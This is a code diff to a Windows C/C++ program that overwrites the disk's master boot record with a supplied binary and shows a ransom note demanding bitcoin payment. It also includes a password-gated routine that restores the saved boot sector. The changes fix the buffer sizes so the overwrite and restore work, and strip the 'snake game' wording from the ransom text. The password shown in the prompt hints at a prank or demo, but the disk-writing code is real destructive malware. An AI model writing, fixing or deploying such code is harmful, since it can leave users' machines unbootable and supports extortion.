@@ -70,7 +70,7 @@ void overWriteMBR(char* pathToBin){
             DWORD size = GetFileSize(binary, 0);
             if (size > 0){
                 byte *mbr = new byte[size]; 
-                if (ReadFile(binary, mbr, BLOCK_SIZE, &dw, 0)){ 
+                if (ReadFile(binary, mbr, size, &dw, 0)){ 
                     printf("Binary file successfuly read!\n");
                     //OverWrite The MBR
                     if (WriteFile(drive, mbr, size, &dw, 0)){
@@ -110,7 +110,7 @@ void restoreMBR(char* localMBR){
             //Coppy the content of the original MBR in the mbr buffer. byte  = unsigned char.
             memcpy(mbr,localMBR,BLOCK_SIZE);
             //Overwriting the MBR
-            if (WriteFile(drive, mbr, size, &dw, 0)){
+            if (WriteFile(drive, mbr, BLOCK_SIZE, &dw, 0)){
                 printf("First sector restored successfuly!\n"); 
             }
             else
@@ -138,7 +138,7 @@ int main(){
     //Overwrite the mbr
     overWriteMBR("data.bin");
 
-    printf("Your MBR has been overwritten with a snake game\n");
+    printf("Your MBR has been overwritten\n");
     printf("Pay 10000000 $$ in bitcoin to MasterHacker200 in order to get your MBR back\n");
     printf("After your payment you will receive a password\n");
     printf("Closing this program will cause you to lose all your files!");
@@ -149,7 +149,7 @@ int main(){
         printf("You have %d attempts left\n",count);
         printf("Enter pass number (Correct Password is 500): \n");
         scanf("%d",&input);
-        if(input == pass){
+        if(input == passVal){
             printf("Well done....trying to restore your MBR! fingers crossed\n");
             //Restore the MBR
             restoreMBR(localMBR);
@@ -158,7 +158,7 @@ int main(){
         }
         count--;
     }
-    printf(" :( Enjoy playing snake :(\n");
+    printf(" :( Bye :(\n");
      _getch();
 
  return 0;   
